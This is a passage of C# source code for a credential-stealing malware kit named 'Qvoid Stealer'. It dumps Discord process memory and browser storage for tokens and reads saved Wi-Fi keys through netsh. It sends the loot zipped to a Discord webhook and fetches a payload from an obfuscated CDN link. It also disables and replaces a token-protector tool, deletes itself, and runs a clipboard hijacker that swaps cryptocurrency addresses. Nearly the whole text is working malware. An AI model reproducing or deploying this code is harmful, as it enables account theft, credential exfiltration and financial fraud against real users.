            if (!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(Other.Sort(HeadMessage + BodyMessage).Replace(Environment.NewLine, "")) != File.ReadAllText(usersPath)))
            {
                //Writing the log file.
                File.WriteAllText(usersPath, Encryption.ComputeSha256Hash((HeadMessage + BodyMessage).Replace(Environment.NewLine, "")));

                if (File.Exists(finalZip))
                    File.Delete(finalZip);

                if (clientsData.Count > 0)
                {
                    File.WriteAllText(filesDir + "\\RawTokens.txt", string.Join(Environment.NewLine, Users.Select(t => t.Value.Token)));
                    File.WriteAllText(filesDir + "\\TokensInformation.txt", string.Join($"{Environment.NewLine}-----------------------------------------------------{Environment.NewLine}", clientsData));
                }

                ZipFile.CreateFromDirectory(filesDir, finalZip);

                Settings.Webhook.Send(new DiscordMessage()
                {
                    Embeds = new List<DiscordEmbed>()
                    {
                        new DiscordEmbed()
                        {
                            Timestamp = DateTime.UtcNow,
                            Color = Other.Spectrum(0),
                            Fields = fields,
                            Title = "Victim's computer inspects & information",
                        },
                    },
                    Username = "Qvoid Stealer",
                    AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
                }, new FileInfo[] { new FileInfo(finalZip) });

                if (Users.Count > 0)
                {
                    foreach (var user in Users)
                    {
                        string friendsMessage = "";
                        var rarestFriends = user.Value.TopRarestUsers(user.Value.GetFriends(), 10);

                        for (int i = 0; i < rarestFriends.Count; ++i)
                        {
                            var friend = rarestFriends[i];
                            var badges = string.Join(" | ", friend.GetBadges(friend.PublicFlags));
                            if (string.IsNullOrEmpty(badges))
                                badges = "";
                            else
                                badges = $"| {badges}";

                            friendsMessage += $"{Environment.NewLine}{i + 1}) **{(friend.Rarity > 0 ? "GOOD" : "NOOB")}** - {friend.Username}#{friend.Discriminator} {badges}";
                        }

                        var userEmbed = user.Key;
                        userEmbed.Color = Other.Spectrum(2);

                        DiscordEmbed friendsEmbed = new DiscordEmbed();
                        friendsEmbed.Description = friendsMessage;
                        friendsEmbed.Color = Other.Spectrum(0);
                        friendsEmbed.Title = $"{user.Value.Username}#{user.Value.Discriminator}'s top 10 rarest relationships";
                        friendsEmbed.Color = userEmbed.Color;


                        Settings.Webhook.Send(new DiscordMessage()
                        {
                            Embeds = new List<DiscordEmbed>()
                            {
                                userEmbed,
                                friendsEmbed
                            },
                            Username = "Qvoid Stealer",
                            AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
                        });
                    }
                }

                if (!Settings.Silent && String.IsNullOrEmpty(_Token))
                {
                    //Closing Discord
                    var DiscordProcs = Process.GetProcessesByName("Discord");
                    foreach (var proc in DiscordProcs)
                        try { proc.Kill(); } catch { }

                    //Starting Discord
                    if (!String.IsNullOrEmpty(discord.Name))
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
                }

                return 0;
            }

            #region THERE IS NO USER LOGGED IN
            if (!(!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(Other.Sort(HeadMessage).Replace(Environment.NewLine, "")) != File.ReadAllText(usersPath))))
                return 0;

            File.WriteAllText(usersPath, Encryption.ComputeSha256Hash(Other.Sort(HeadMessage).Replace(Environment.NewLine, "")));

            if (File.Exists(finalZip))
                File.Delete(finalZip);

            ZipFile.CreateFromDirectory(filesDir, finalZip);

            Settings.Webhook.Send(new DiscordMessage()
            {
                Embeds = new List<DiscordEmbed>()
                {
                    new DiscordEmbed()
                    {
                        Footer = new EmbedFooter
                        {
                            Text = "Qvoid Stealer | Paid version",
                        },
                        Timestamp = DateTime.UtcNow,
                        Color = Other.Spectrum(0),
                        Fields = fields,
                        Title = "New victim entered the trap!",
                        Description = $"Injected successfully ... waiting for the victim to relogin."
                    }
                },
                Username = "Qvoid Stealer",
                AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
            }, new FileInfo[] { new FileInfo(finalZip) });

            if (!Settings.Silent)
            {
                //Closing Discord
                var DiscordProcs = Process.GetProcessesByName("Discord");
                foreach (var proc in DiscordProcs)
                    try { proc.Kill(); } catch { }

                //Starting Discord
                if (!String.IsNullOrEmpty(discord.Name))
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
            }

            return 1;
            #endregion
        }

        static public void Initialize(string[] args)
        {
            var code = Grab(args);
            if (code == 0)
                return;

            if (code == 1)
            {
                //First time
            }
            else if (code == 2)
            {
                //Discord not found
            }
        }

        /// <summary>
        /// Extracts the grabber dependencies to the destination directory.
        /// </summary>
        /// <param name="Path"></param>
        /// <param name="Destination"></param>
        static public void Extract(string Path, string Destination)
        {
            Directory.CreateDirectory(Path);

            FileInfo info = new FileInfo(Path + "Release.zip");
            string _link = Encryption.ROT13("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/827625760843235368/942786364246736907/Eryrnfr.mvc");

            if (!info.Exists)
            {
                //Downloads the dependencies if they don't exists.
                using (WebClient wc = new WebClient())
                    wc.DownloadFile(_link, Path + "Release.zip");
            }
            else
            {
                //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
                if (info.Length <= 5300)
                    using (WebClient wc = new WebClient())
                        wc.DownloadFile(_link, Path + "Release.zip");
            }

            try
            {
                //Extracts the ZIP content (dependencies) to the destination directory.
                ZipFile.ExtractToDirectory(Path + "Release.zip", Destination);
            }
            catch
            { }
        }

        /// <summary>
        /// Deletes all the files and traces created by the grabber.
        /// </summary>
        static public void DeleteTraces(bool DeleteRecursive = false, bool Destruct = true)
        {
            try
            {
                string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 10)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";
                if (Directory.Exists(path))
                    Directory.Delete(path, true);
            }
            catch (Exception ex) { Debug.WriteLine("Error occured while deleting the main Path;" + ex.Message); }

            if (DeleteRecursive)
            {
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 20)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";
                if (File.Exists(usersPath))
                {
                    try { File.Delete(usersPath); }
                    catch (Exception ex) { Debug.WriteLine("Error occured while deleting the log file;" + ex.Message); }
                }
            }

            if (Destruct)
            {
                string app = AppDomain.CurrentDomain.FriendlyName;
                string AppPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + $@"\{app}";

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "cmd.exe";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + AppPath;
                Process.Start(startInfo);

                Process.GetCurrentProcess().Kill();
            }
        }
    }

    /// <summary>
    /// Contains everything releated to the Discord process. 
    /// </summary>
    public class Discord
    {
        public List<string> TokensPaths { get; } = new List<string>();
        public List<string> Voices { get; } = new List<string>();
        public List<string> Cores { get; } = new List<string>();
        public List<DiscordClient> DumpedClients { get; private set; } = new List<DiscordClient>();
        public List<string> DumpedTokens { get; private set; } = new List<string>();

        public bool IsExists { get; private set; }
        public Version Version { get; }
        public string Name { get; }
        public FileInfo FileInfo { get; }
        public List<Process> Processes { get; }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt32 ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        /// <summary>
        /// The constructor will find us all the information we need about the client and possible tokens locations.
        /// </summary>
        public Discord()
        {
            this.Processes = Process.GetProcessesByName("discord").ToList();
            Voices = new List<string>();
            Cores = new List<string>();
            TokensPaths = new List<string>();

            var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                    var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
                    var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
                    var capture_exe = Directory.GetFiles(directory, "capture_helper.exe", SearchOption.AllDirectories);

                    foreach (var coreFile in core)
                        foreach (var indexFile in index)
                            if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
                                Cores.Add(coreFile.Replace("core.asar", ""));

                    foreach (var capture in capture_exe)
                        foreach (var indexFile in index)
                            if (capture.Replace("capture_helper.exe", "") == indexFile.Replace("index.js", ""))
                                Voices.Add(capture.Replace("capture_helper.exe", ""));

                    foreach (var file in discord_exe)
                    {
                        FileInfo info = new FileInfo(file);
                        if (info.Length > 60000)
                        {
                            var objInfo = FileVersionInfo.GetVersionInfo(file);
                            if (objInfo.LegalCopyright == "Copyright (c) 2022 Discord Inc. All rights reserved.")
                            {
                                if (objInfo.FileName.EndsWith("Discord.exe"))
                                {
                                    foreach (var proc in Processes.ToList())
                                    {
                                        if (proc.MainModule.FileName != objInfo.FileName)
                                            Processes.Remove(proc);
                                    }

                                    if (Processes != null && Processes.Count > 0)
                                    {
                                        if (Processes.ToList().First().MainModule.FileName == objInfo.FileName)
                                        {
                                            FileInfo = new FileInfo(Processes.First().MainModule.FileName);
                                            Name = Processes.First().MainModule.FileName;
                                            Version = new Version(objInfo.FileVersion);
                                        }
                                    }
                                    else
                                    {
                                        FileInfo = new FileInfo(file);
                                        Name = file;
                                        Version = new Version(objInfo.FileVersion);
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            }

            this.IsExists = FileInfo != null && FileInfo.Exists;

            directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var subDirectories = Directory.GetDirectories(directory);
                    foreach (var localDirectory in subDirectories)
                    {
                        if (localDirectory.Contains("Local Storage"))
                        {
                            var temp = Directory.GetDirectories(localDirectory);
                            foreach (var item in temp)
                                if (item.Contains("leveldb"))
                                    TokensPaths.Add($"{item}\\");
                        }
                    }
                }
            }

            if (TokensPaths.Count == 0)
            {
                if (File.Exists(Name.Replace("Discord.exe", "") + "resources\\tmp\\common\\paths.js"))
                {
                    var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
                    var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
                    foreach (var _file in newLocation_tray)
                    {
                        foreach (var __file in newLocation_Transport)
                        {
                            if (_file.Replace("tray-connected.png", "") == __file.Replace("badge-11.ico", ""))
                            {
                                if (Directory.Exists(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb"))
                                    TokensPaths.Add(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb");
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Dumping tokens from the process and check them.
        /// </summary>
        public void Dump()
        {
            List<DiscordClient> clients = new List<DiscordClient>();
            List<string> tokens = new List<string>();

            foreach (Process proid in Process.GetProcessesByName("discord"))
            {
                uint ProcessId = (uint)proid.Id;
                IntPtr hProcess = proid.Handle;
                string dumpPath = Path.GetTempPath() + $"\\Report28251213-{DateTime.UtcNow.Ticks % 50000}.log";
                using (FileStream procdumpFileStream = File.Create(dumpPath))
                    MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, 0x2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                string fileContent = File.ReadAllText(dumpPath);

                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);
                MatchCollection encryptedMatches = Regex.Matches(fileContent, "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                foreach (Match match in matches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (Match match in mfaMatches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (Match match in encryptedMatches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (var token in tokens)
                {
                    var client = new DiscordClient(token);
                    if (client.IsValidToken)
                        this.DumpedClients.Add(client);
                }

                File.Delete(dumpPath);
            }

            DumpedClients.AddRange(clients);
            DumpedTokens.AddRange(tokens);

            DumpedClients = DumpedClients.Distinct().ToList();
            DumpedTokens = DumpedTokens.Distinct().ToList();
        }

        /// <summary>
        /// Bypassing known token protectors and replacing the protectors with the grabber ^^.
        /// </summary>
        public void BypassProtectors(string Path)
        {
            List<Protector> protectors = new List<Protector>()
            {
                new Protector()
                {
                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
                    Name = "DiscordTokenProtector"
                },
                new Protector()
                {
                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
                    Name = "DiscordTokenProtector"
                },
            };

            foreach (var protector in protectors)
            {
                var process = Process.GetProcessesByName(protector.Name);
                if (process.Length > 0)
                {
                    foreach (var proc in process)
                    {
                        //Terminating the protector
                        try { proc.Kill(); }
                        catch (Exception ex)
                        {
                            if (ex.Message.Contains("Access"))
                            {
                                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                {
                                    //Could not terminate the protector because it has higher privileges.
                                    using (Process newProc = new Process())
                                    {
                                        while (true)
                                        {
                                            try
                                            {
                                                newProc.StartInfo.FileName = Application.ExecutablePath;
                                                newProc.StartInfo.CreateNoWindow = true;
                                                newProc.StartInfo.UseShellExecute = true;
                                                newProc.StartInfo.Verb = "runas";
                                                newProc.Start();

                                                break;
                                            }
                                            catch (Exception)
                                            { continue; }
                                        }
                                    }
                                }
                            }
                        }

                        try
                        {
                            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                Environment.Exit(0);

                            string MainModulePath = protector.Directory;
                            if (!Directory.Exists(MainModulePath))
                                continue;

                            Grabber.Extract(Path, protector.Directory);

                            Thread.Sleep(100);
                            if (File.Exists($"{protector.Directory}\\{protector.Name}.exe"))
                                File.Delete($"{protector.Directory}\\{protector.Name}.exe");

                            Thread.Sleep(1000);
                            File.Copy(Assembly.GetEntryAssembly().Location, $"{protector.Directory}\\{protector.Name}.exe");
                        }
                        catch (Exception ex)
                        {
                            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
                            continue;
                        }
                    }

                }
            }

            var DiscordProcs = Process.GetProcessesByName("Discord");
            foreach (var proc in DiscordProcs)
                try { proc.Kill(); } catch { }

            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public List<string> GetTokens()
        {
            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var finalTokens = new List<string>();

            var possibleLocations = new List<string>()
            {
                localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
                roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
                roaming + "\\Lightcord\\Local Storage\\leveldb",
                roaming + "\\Amigo\\Local Storage\\leveldb",
                roaming + "\\Torch\\Local Storage\\leveldb",
                roaming + "\\Kometa\\Local Storage\\leveldb",
                roaming + "\\Orbitum\\Local Storage\\leveldb",
                roaming + "\\CentBrowser\\Local Storage\\leveldb",
                roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
                roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
                roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
                roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
            };
            possibleLocations.AddRange(this.TokensPaths);

            finalTokens.AddRange(Other.FindTokens(possibleLocations, this.Name));

            finalTokens.AddRange(Other.FindTokensGecko(new List<string>()
            {
                roaming + "\\Mozilla\\Firefox\\Profiles",
                roaming + "\\Waterfox\\Profiles",
                roaming + "\\Moonchild Productions\\Pale Moon\\Profiles",
            }, this.Name));

            return finalTokens;
        }
    }

    /// <summary>
    /// Implementation for "netsh wlan show profile" command.
    /// </summary>
    public class WirelessLan
    {
        public bool IsAvailable { get; private set; } = true;
        public List<SSID> SSIDs { get; private set; } = new List<SSID>();

        public class SSID
        {
            public Profile Profile { get; private set; }
            public Connectivity Connectivity { get; private set; }
            public Security Security { get; private set; }

            public SSID(Profile profile, Connectivity connectivity, Security security)
            {
                this.Profile = profile;
                this.Connectivity = connectivity;
                this.Security = security;
            }
        }

        public class Profile
        {
            public string Version { get; private set; }
            public string Type { get; } = "Wireless Lan";
            public string Name { get; private set; }
            public Controls _Controls { get; private set; } = new Controls();

            public Profile(string profileInformation)
            {
                string[] fields = profileInformation.Substring(profileInformation.IndexOf("Profile information \r\n------------------- \r\n    ") + "Profile information \r\n------------------- \r\n    ".Length).Split(new string[] { "\r\n        " }, StringSplitOptions.None);
                string[] queries = fields[0].Split(new string[] { "\r\n    " }, StringSplitOptions.None);

                Version = queries[0].Split(':')[1].Substring(1);
                Name = queries[2].Split(':')[1].Substring(1);

                _Controls.Connection = fields[1].Split(':')[1].Contains("auto") ? Controls.ConnectionMode.Auto : Controls.ConnectionMode.Manual;
                _Controls.MacRandomization = !fields[4].Split(':')[1].Contains("disab");
                _Controls.AutoSwitch = !fields[3].Split(':')[1].Contains("Do not switch");
                _Controls.Broadcast = fields[2].Split(':')[1].Substring(1);
            }

            public class Controls
            {
                public enum ConnectionMode
                {
                    Auto,
                    Manual
                }

                public ConnectionMode Connection;
                public string Broadcast { get; internal set; }
                public bool AutoSwitch { get; internal set; }
                public bool MacRandomization { get; internal set; }
            }
        }

        public class Connectivity
        {
            public int SSIDs { get; private set; }
            public string Name { get; private set; }
            public string Type { get; private set; }
            enum _Type
            {
                IBSS,
                ESS
            }

            public Connectivity(string connectivitySettings)
            {
                var fields = connectivitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);
                SSIDs = int.Parse(fields[1].Split(':')[1].Substring(1));
                Name = fields[2].Split(':')[1].Substring(1).Replace("\"", "");
                Type = fields[3].Split(':')[1].Substring(1);
            }
        }

        public class Security
        {
            public enum Authentication
            {
                Open,
                Shared,
                WPA,
                WPAPSK,
                WPA2,
                WPA2PSK
            }

            public enum Chiper
            {
                None = 0x00,
                WEP40 = 0x01,
                TKIP = 0x02,
                CCMP = 0x04,
                WEP104 = 0x05,
                WPA_USER_GROUP = 0x100,
                RSN_USE_GROUP = 0x100,
                WEP = 0x101,
            }

            public Authentication _Authentication { get; private set; }
            public Chiper _Chiper { get; private set; }
            public bool SecurityKeyPresent { get; private set; }
            public string Key { get; private set; }

            public Security(string securitySettings)
            {
                string[] fields = securitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);

                foreach (var field in fields)
                    if (field.Contains("Security key"))
                        SecurityKeyPresent = field.Split(':')[1].Substring(1).Contains("Present");

                if (SecurityKeyPresent && fields.Length == 7)
                    Key = fields[6].Split(':')[1].Substring(1);
                _Chiper = (Chiper)Enum.Parse(typeof(Chiper), fields[2].Split(':')[1].Substring(1));
                _Authentication = (Authentication)Enum.Parse(typeof(Authentication), fields[1].Split(':')[1].Substring(1).Contains("-") ? fields[1].Split(':')[1].Substring(1).Split('-')[0] : fields[1].Split(':')[1].Substring(1));
            }
        }

        public WirelessLan()
        {
            Process proc = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "netsh.exe",
                    Arguments = "wlan show profile",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                },
            };
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();
            if (!output.Contains("\r\n\r\nUser profiles\r\n-------------\r\n"))
            {
                IsAvailable = false;
                return;
            }

            string[] content = output.Split(new string[] { "\r\n\r\nUser profiles\r\n-------------\r\n" }, StringSplitOptions.None)[1].Split(':');

            proc.Close();
            proc.Dispose();

            List<string> SSIDs = new List<string>();
            Dictionary<string, string> Modules = new Dictionary<string, string>();

            content.ToList().ForEach(i =>
            {
                var ssid = i.Split(new string[] { "All User Profile" }, StringSplitOptions.None);
                if (ssid.Length > 0 && ssid[0].Contains("\r\n"))
                    SSIDs.Add(ssid[0].Split(new string[] { "\r\n" }, StringSplitOptions.None)[0].Substring(1));
            });

            foreach (var ssid in SSIDs)
            {
                proc = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh.exe",
                        Arguments = $"wlan show profile {ssid} key=clear",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                    },
                };
                proc.Start();

                string result = proc.StandardOutput.ReadToEnd();
                var options = result.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None);
                if (options[0].Contains("There is no such wireless interface on the system"))
                    continue;

                this.SSIDs.Add(new SSID(new Profile(options[2]), new Connectivity(options[3]), new Security(options[4])));

                proc.Close();
                proc.Dispose();
            }
        }
    }

    /// <summary>
    /// Model class
    /// </summary>
    sealed class Protector
    {
        public string Directory { get; set; }
        public string Name { get; set; }
    }

    /// <summary>
    /// Simple Crypto clipper.
    /// </summary>
    public class CryptoClipper
    {
        public struct Patterns
        {
            public static Regex BTC = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", RegexOptions.Compiled);
            public static Regex ETH = new Regex("/^0x[a-fA-F0-9]{40}$/", RegexOptions.Compiled);
            public static Regex DOGE = new Regex("D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}", RegexOptions.Compiled);
            public static Regex LTC = new Regex("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}", RegexOptions.Compiled);
            public static Regex XMR = new Regex("[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}", RegexOptions.Compiled);
            public static Regex DASH = new Regex("X[1-9A-HJ-NP-Za-km-z]{33}", RegexOptions.Compiled);
            public static Regex XRP = new Regex("r[0-9a-zA-Z]{24,34}", RegexOptions.Compiled);
            public static Regex NEO = new Regex("A[0-9a-zA-Z]{33}", RegexOptions.Compiled);
        }

        public bool Enabled;
        public string BTC_Address { get; internal set; }
        public string ETH_Address { get; private set; }
        public string DOGE_Address { get; private set; }
        public string LTC_Address { get; private set; }
        public string XMR_Address { get; private set; }
        public string DASH_Address { get; private set; }
        public string NEO_Address { get; private set; }
        public string XRP_Address { get; private set; }

        public CryptoClipper(string BTC, string ETH, string DOGE, string LTC, string XMR, string DASH, string NEO, string XRP)
        {
            if (IsValid(Patterns.BTC, BTC, ""))
                this.BTC_Address = BTC;
            else if (IsValid(Patterns.ETH, ETH, ""))
                this.ETH_Address = ETH;
            else if (IsValid(Patterns.LTC, LTC, ""))
                this.LTC_Address = LTC;
            else if (IsValid(Patterns.XMR, XMR, ""))
                this.XMR_Address = XMR;
            else if (IsValid(Patterns.DOGE, DOGE, ""))
                this.DOGE_Address = DOGE;
            else if (IsValid(Patterns.DASH, DASH, ""))
                this.DASH_Address = DASH;
            else if (IsValid(Patterns.XRP, XRP, ""))
                this.XRP_Address = XRP;
            else if (IsValid(Patterns.NEO, NEO, ""))
                this.NEO_Address = NEO;

            Enabled = !string.IsNullOrEmpty(this.NEO_Address)
                   || !string.IsNullOrEmpty(this.BTC_Address)
                   || !string.IsNullOrEmpty(this.ETH_Address)
                   || !string.IsNullOrEmpty(this.LTC_Address)
                   || !string.IsNullOrEmpty(this.XMR_Address)
                   || !string.IsNullOrEmpty(this.DOGE_Address)
                   || !string.IsNullOrEmpty(this.DASH_Address)
                   || !string.IsNullOrEmpty(this.XRP_Address);
        }

        public void Start()
        {
            Thread t = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(100);

                    string text = string.Empty;
                    try { text = Clipboard.GetText(); }
                    catch { continue; }

#pragma warning disable CS0642
                    if (IsValid(Patterns.BTC, text, BTC_Address)) ;
                    else if (IsValid(Patterns.ETH, text, ETH_Address)) ;
                    else if (IsValid(Patterns.LTC, text, LTC_Address)) ;
                    else if (IsValid(Patterns.XMR, text, XMR_Address)) ;
                    else if (IsValid(Patterns.DOGE, text, DOGE_Address)) ;
                    else if (IsValid(Patterns.DASH, text, DASH_Address)) ;
                    else if (IsValid(Patterns.XRP, text, XRP_Address)) ;
                    else if (IsValid(Patterns.NEO, text, NEO_Address)) ;
                    //You can add here more wallets...
#pragma warning restore CS0642
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join();

            while (t.IsAlive)
                Thread.Sleep(1);
        }

        public bool IsValid(Regex regex, string input, string Address)
        {
            //Checking if the address that we will replace is not empty (because we don't want to replace his wallet with empty wallt) and if the given text matching the expression.
            if (!string.IsNullOrEmpty(Address) && regex.Match(input).Success)
            {
                Clipboard.SetText(Address);
                return true;
            }

            return false;
        }
    }
}
